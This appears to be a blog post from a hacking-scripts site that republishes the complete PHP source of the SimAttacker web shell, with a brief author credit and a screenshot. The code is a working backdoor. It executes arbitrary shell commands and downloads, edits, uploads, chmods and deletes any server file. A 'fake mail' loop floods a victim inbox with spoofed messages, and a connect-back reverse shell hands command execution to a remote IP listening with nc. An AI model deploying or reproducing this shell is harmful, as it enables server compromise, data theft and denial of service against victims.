---
id: 279
title: SimAttacker Shell
author: admin
layout: post
guid: http://hackingscripts.com/?p=279
permalink: /simattacker-shell/
categories:
  - PHP
tags:
  - PHP
---
I previously called this &#8216;best friends shell&#8217;. I now know that it&#8217;s called the SimAttacker shell.

Coded by Hossein Asgary, an Iranian hacker who is part of Simorgh Security Group.


### SimAttacker Shell Source Code

{% highlight php linenos %}<?
//download Files  Code
$fdownload=$_GET['fdownload'];
if ($fdownload &lt;&gt; "" ){
// path & file name
$path_parts = pathinfo("$fdownload");
$entrypath=$path_parts["basename"];
$name = "$fdownload";
$fp = fopen($name, 'rb');
header("Content-Disposition: attachment; filename=$entrypath");
header("Content-Length: " . filesize($name));
fpassthru($fp);
exit;
}
?>
    
&lt;html&gt;

&lt;head&gt;
&lt;meta http-equiv="Content-Language" content="en-us"&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1252"&gt;
&lt;title&gt;SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend &lt;/title&gt;
&lt;style&gt;
&lt;!--
body         { font-family: Tahoma; font-size: 8pt }
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
<?
error_reporting(E_ERROR | E_WARNING | E_PARSE);

 //File Edit
 $fedit=$_GET['fedit'];
 if ($fedit &lt;&gt; "" ){
 $fedit=realpath($fedit);
 $lines = file($fedit);
 echo "&lt;form action='' method='POST'&gt;";
echo "&lt;textarea name='savefile' rows=30 cols=80&gt;" ;
foreach ($lines as $line_num =&gt; $line) {
 echo htmlspecialchars($line);
}
echo "&lt;/textarea&gt;
    &lt;input type='text' name='filepath'  size='60' value='$fedit'&gt;
    &lt;input type='submit' value='save'&gt;&lt;/form&gt;";
    $savefile=$_POST['savefile'];
    $filepath=realpath($_POST['filepath']);
    if ($savefile &lt;&gt; "") 
    {
    $fp=fopen("$filepath","w+");
    fwrite ($fp,"") ;
    fwrite ($fp,$savefile) ;
    fclose($fp);
    echo "&lt;script language='javascript'&gt; close()&lt;/script&gt;";
    }
exit();
 }
?>
<?
// CHmod - PRimission
$fchmod=$_GET['fchmod'];
if ($fchmod &lt;&gt; "" ){
$fchmod=realpath($fchmod);
echo "&lt;center&gt;&lt;br&gt;
chmod for :$fchmod&lt;br&gt;
&lt;form method='POST' action=''&gt;&lt;br&gt;
Chmod :&lt;br&gt;
&lt;input type='text' name='chmod0' &gt;&lt;br&gt;
&lt;input type='submit' value='change chmod'&gt;
&lt;/form&gt;";
$chmod0=$_POST['chmod0'];
if ($chmod0 &lt;&gt; ""){
chmod ($fchmod , $chmod0);
}else {
echo "primission Not Allow change Chmod";
}
exit();
}
?>
    
&lt;div align="center"&gt;
    &lt;table border="1" width="100%" id="table1" style="border: 1px dotted #FFCC99" cellspacing="0" cellpadding="0" height="502"&gt;
        &lt;tr&gt;
            &lt;td style="border: 1px dotted #FFCC66" valign="top" rowspan="2"&gt;
                &lt;p align="center"&gt;&lt;b&gt;
                &lt;font face="Tahoma" size="2"&gt;&lt;br&gt;
                &lt;/font&gt;
                &lt;font color="#D2D200" face="Tahoma" size="2"&gt;
                &lt;span style="text-decoration: none"&gt;
                &lt;font color="#000000"&gt;
                &lt;a href="?id=fm&dir=<?
    echo getcwd();
    ?>
    "&gt;
                &lt;span style="text-decoration: none"&gt;&lt;font color="#000000"&gt;File Manager&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;/font&gt;&lt;/span&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
                &lt;p align="center"&gt;&lt;b&gt;&lt;a href="?id=cmd"&gt;
                &lt;span style="text-decoration: none"&gt;
                &lt;font face="Tahoma" size="2" color="#000000"&gt;
                CMD&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;font face="Tahoma" size="2"&gt; Shell&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
                &lt;p align="center"&gt;&lt;b&gt;&lt;a href="?id=fake-mail"&gt;
                &lt;font face="Tahoma" size="2" color="#000000"&gt;
                &lt;span style="text-decoration: none"&gt;Fake mail&lt;/span&gt;&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;
                &lt;p align="center"&gt;&lt;b&gt;
                &lt;font face="Tahoma" size="2" color="#000000"&gt;
                &lt;a href="?id=cshell"&gt;
                &lt;span style="text-decoration: none"&gt;&lt;font color="#000000"&gt;Connect Back&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
                &lt;p align="center"&gt;&lt;b&gt;
                &lt;font color="#000000" face="Tahoma" size="2"&gt;
                &lt;a href="?id="&gt;
                &lt;span style="text-decoration: none"&gt;&lt;font color="#000000"&gt;About&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
                &lt;p&gt;&nbsp;&lt;p align="center"&gt;&nbsp;&lt;/td&gt;
            &lt;td height="422" width="82%" style="border: 1px dotted #FFCC66" align="center"&gt;
            <?
            //*******************************************************
            //Start Programs About US
            $id=$_GET['id'];

            if ($id=="") {
            echo "
            &lt;font face='Arial Black' color='#808080' size='1'&gt;
***************************************************************************&lt;br&gt;
&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM &lt;br&gt;
&nbsp;Programer : Hossein Asgary &lt;br&gt;
&nbsp;Note : SimAttacker&nbsp; Have copyright from simorgh security Group  &lt;br&gt;
&nbsp;please : If you find bug or problems in program , tell me by : &lt;br&gt;
&nbsp;e-mail : admin(at)simorgh-ev(dot)com&lt;br&gt;
Enjoy <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> [Only 4 Best Friends ] &lt;br&gt;
***************************************************************************&lt;/font&gt;&lt;/span&gt;&lt;/p&gt;
";

echo "&lt;font color='#333333' size='2'&gt;OS :". php_uname();
echo "&lt;br&gt;IP :". 
($_SERVER['REMOTE_ADDR']);
echo "&lt;/font&gt;";


            }
            //************************************************************
            //cmd-command line
            $cmd=$_POST['cmd'];
            if($id=="cmd"){
        $result=shell_exec("$cmd");
        echo "&lt;br&gt;&lt;center&gt;&lt;h3&gt; CMD ExeCute &lt;/h3&gt;&lt;/center&gt;" ;
        echo "&lt;center&gt;
        &lt;textarea rows=20 cols=70 &gt;$result&lt;/textarea&gt;&lt;br&gt;
        &lt;form method='POST' action=''&gt;
        &lt;input type='hidden' name='id' value='cmd'&gt;
        &lt;input type='text' size='80' name='cmd' value='$cmd'&gt;
        &lt;input type='submit' value='cmd'&gt;&lt;br&gt;";
            
            
            
            }
            
        //********************************************************    
        
        //fake mail = Use victim server 4 DOS - fake mail 
        if ( $id=="fake-mail"){
        error_reporting(0);
        echo "&lt;br&gt;&lt;center&gt;&lt;h3&gt; Fake Mail- DOS E-mail By Victim Server &lt;/h3&gt;&lt;/center&gt;" ;
        echo "&lt;center&gt;&lt;form method='post' action=''&gt;
        Victim Mail :&lt;br&gt;&lt;input type='text' name='to' &gt;&lt;br&gt;
        Number-Mail :&lt;br&gt;&lt;input type='text' size='5' name='nom' value='100'&gt;&lt;br&gt;
        Comments:
        &lt;br&gt;
        &lt;textarea rows='10' cols=50 name='Comments' &gt;&lt;/textarea&gt;&lt;br&gt;
        &lt;input type='submit' value='Send Mail Strm ' &gt;
        &lt;/form&gt;&lt;/center&gt;";
        //send Storm Mail
        $to=$_POST['to'];
        $nom=$_POST['nom'];
        $Comments=$_POST['Comments'];
        if ($to &lt;&gt; "" ){
        for ($i = 0; $i &lt; $nom ; $i++){
        $from = rand (71,1020000000)."@"."Attacker.com";
        $subject= md5("$from");
        mail($to,$subject,$Comments,"From:$from");
        echo "$i is ok";
        }      
        echo "&lt;script language='javascript'&gt; alert('Sending Mail - please waite ...')&lt;/script&gt;";
        }
        }
        //********************************************************

            //Connect Back -Firewall Bypass
            if ($id=="cshell"){
            echo "&lt;br&gt;Connect back Shell , bypass Firewalls&lt;br&gt;
            For user :&lt;br&gt;
            nc -l -p 1019 &lt;br&gt;
            &lt;hr&gt;
            &lt;form method='POST' action=''&gt;&lt;br&gt;
            Your IP & BindPort:&lt;br&gt;
            &lt;input type='text' name='mip' &gt;
            &lt;input type='text' name='bport' size='5' value='1019'&gt;&lt;br&gt;
            &lt;input type='submit' value='Connect Back'&gt;
            &lt;/form&gt;";
         $mip=$_POST['mip'];
         $bport=$_POST['bport'];
         if ($mip &lt;&gt; "")
         {
         $fp=fsockopen($mip , $bport , $errno, $errstr);
         if (!$fp){
               $result = "Error: could not open socket connection";
         }
         else {
         fputs ($fp ,"\n*********************************************\nWelcome T0 SimAttacker 1.00  ready 2 USe\n*********************************************\n\n");
      while(!feof($fp)){ 
       fputs ($fp," bash # ");
       $result= fgets ($fp, 4096);
      $message=`$result`;
       fputs ($fp,"--&gt; ".$message."\n");
      }
      fclose ($fp);
         }
         }
            }
            
        //********************************************************
            //Spy File Manager
            $homedir=getcwd();
            $dir=realpath($_GET['dir'])."/";
            if ($id=="fm"){
            echo "&lt;br&gt;&lt;b&gt;&lt;p align='left'&gt;&nbsp;Home:&lt;/b&gt; $homedir 
                  &nbsp;&lt;b&gt;
                  &lt;form action='' method='GET'&gt;
                  &nbsp;Path:&lt;/b&gt;
                  &lt;input type='hidden' name='id' value='fm'&gt;
                  &lt;input type='text' name='dir' size='80' value='$dir'&gt;
                  &lt;input type='submit' value='dir'&gt;
                  &lt;/form&gt;
                 &lt;br&gt;";

            echo "

&lt;div align='center'&gt;

&lt;table border='1' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'&gt;
    &lt;tr&gt;
        &lt;td width='300' height='30' align='left'&gt;&lt;b&gt;&lt;font size='2'&gt;File / Folder Name&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
        &lt;td height='28' width='82' align='center'&gt;
        &lt;font color='#000080' size='2'&gt;&lt;b&gt;Size KByte&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td height='28' width='83' align='center'&gt;
        &lt;font color='#008000' size='2'&gt;&lt;b&gt;Download&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td height='28' width='66' align='center'&gt;
        &lt;font color='#FF9933' size='2'&gt;&lt;b&gt;Edit&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td height='28' width='75' align='center'&gt;
        &lt;font color='#999999' size='2'&gt;&lt;b&gt;Chmod&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td height='28' align='center'&gt;&lt;font color='#FF0000' size='2'&gt;&lt;b&gt;Delete&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;";
            if (is_dir($dir)){
            if ($dh=opendir($dir)){
            while (($file = readdir($dh)) !== false) {
            $fsize=round(filesize($dir . $file)/1024);
        
            
    echo " 
    &lt;tr&gt;
        &lt;th width='250' height='22' align='left' nowrap&gt;";
        if (is_dir($dir.$file))
        {
        echo "&lt;a href='?id=fm&dir=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font size='2' color='#666666'&gt;&nbsp;$file &lt;font color='#FF0000' size='1'&gt;dir&lt;/font&gt;";
        }
        else {
        echo "&lt;font size='2' color='#666666'&gt;&nbsp;$file ";
        }
        echo "&lt;/a&gt;&lt;/font&gt;&lt;/th&gt;
        &lt;td width='113' align='center' nowrap&gt;&lt;font color='#000080' size='2'&gt;&lt;b&gt;";
        if (is_file($dir.$file))
        {
        echo "$fsize";
        }
        else {
        echo "&nbsp; ";
        }
        echo "
        &lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td width='103' align='center' nowrap&gt;";
        if (is_file($dir.$file)){
        if (is_readable($dir.$file)){
        echo "&lt;a href='?id=fm&fdownload=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font size='2' color='#008000'&gt;download";
        }else {
        echo "&lt;font size='1' color='#FF0000'&gt;&lt;b&gt;No ReadAble&lt;/b&gt;";
         }
        }else {
        echo "&nbsp;";
         }
        echo "
        &lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td width='77' align='center' nowrap&gt;";
        if (is_file($dir.$file))
        {
        if (is_readable($dir.$file)){
        echo "&lt;a target='_blank' href='?id=fm&fedit=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font color='#FF9933' size='2'&gt;Edit";
        }else {
        echo "&lt;font size='1' color='#FF0000'&gt;&lt;b&gt;No ReadAble&lt;/b&gt;";
         }
        }else {
        echo "&nbsp;";
         }
        echo "
        &lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td width='86' align='center' nowrap&gt;";
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        echo "&lt;font size='1' color='#999999'&gt;Dont in windows";
        }
        else {
        echo "&lt;a href='?id=fm&fchmod=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font size='2' color='#999999'&gt;Chmod";
        }
        echo "&lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td width='86'align='center' nowrap&gt;&lt;a href='?id=fm&fdelete=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font size='2' color='#FF0000'&gt;Delete&lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    ";
              }
              closedir($dh);
            } 
            }
            echo "&lt;/table&gt;
&lt;form enctype='multipart/form-data' action='' method='POST'&gt;
 &lt;input type='hidden' name='MAX_FILE_SIZE' value='300000' /&gt;
 Send this file: &lt;input name='userfile' type='file' /&gt;
 &lt;inpt type='hidden' name='Fupath'  value='$dir'&gt;
 &lt;input type='submit' value='Send File' /&gt;
&lt;/form&gt; 
            &lt;/div&gt;";
            }
//Upload Files 
$rpath=$_GET['dir'];
if ($rpath &lt;&gt; "") {
$uploadfile = $rpath."/" . $_FILES['userfile']['name'];
print "&lt;pre&gt;";
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
echo "&lt;script language='javascript'&gt; alert('\:D Successfully uploaded.!')&lt;/script&gt;";
echo "&lt;script language='javascript'&gt; history.back(2)&lt;/script&gt;";
}
 }
 //file deleted
$frpath=$_GET['fdelete'];
if ($frpath &lt;&gt; "") {
if (is_dir($frpath)){
$matches = glob($frpath . '/*.*');
if ( is_array ( $matches ) ) {
  foreach ( $matches as $filename) {
  unlink ($filename);
  rmdir("$frpath");
echo "&lt;script language='javascript'&gt; alert('Success! Please refresh')&lt;/script&gt;";
echo "&lt;script language='javascript'&gt; history.back(1)&lt;/script&gt;";
  }
  }
  }
  else{
echo "&lt;script language='javascript'&gt; alert('Success! Please refresh')&lt;/script&gt;";
unlink ("$frpath");
echo "&lt;script language='javascript'&gt; history.back(1)&lt;/script&gt;";
exit(0);

  }
  

}
            ?>
            
            &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td style="border: 1px dotted #FFCC66"&gt;
            &lt;p align="center"&gt;&lt;font color="#666666" size="1" face="Tahoma"&gt;&lt;br&gt;
            Copyright 2004-Simorgh Security&lt;br&gt;
            Hossein-Asgari&lt;br&gt;
            &lt;/font&gt;&lt;font color="#c0c0c0" size="1" face="Tahoma"&gt;
        &lt;a style="TEXT-DECORATION: none" href="http://www.simorgh-ev.com"&gt;
        &lt;font color="#666666"&gt;www.simorgh-ev.com&lt;/font&gt;&lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;/tr&gt;
    &lt;/table&gt;
&lt;/div&gt;

&lt;/body&gt;

&lt;/html&gt;
{% endhighlight %}


### SimAttacker Shell screenshot<figure id="attachment_409" style="width: 604px;" class="wp-caption aligncenter">

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/best_friends_shell-1024x547.png" alt="SimAttacker script screenshot" width="604" height="322" class="size-large wp-image-409" />][1]<figcaption class="wp-caption-text">SimAttacker script screenshot</figcaption></figure>

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/02/best_friends_shell.png